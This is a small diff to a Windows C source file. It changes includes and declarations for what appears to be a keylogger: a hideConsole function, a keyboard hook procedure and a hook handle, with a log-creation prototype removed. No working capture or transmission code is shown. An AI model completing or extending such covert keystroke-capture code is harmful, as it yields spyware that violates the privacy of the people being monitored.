@@ -1,12 +1,10 @@
-#include <winsock.h>
-#define _WIN32_WINNT 0x0601
+#include "winapi.h"
+#include "net_util.h"
 #include <stdio.h>
 #include <string.h>
-#include <windows.h>
 
 
 void hideConsole();
-void createLog();
 LRESULT WINAPI KeyboardProc(int, WPARAM, LPARAM);
 
 HHOOK hook;
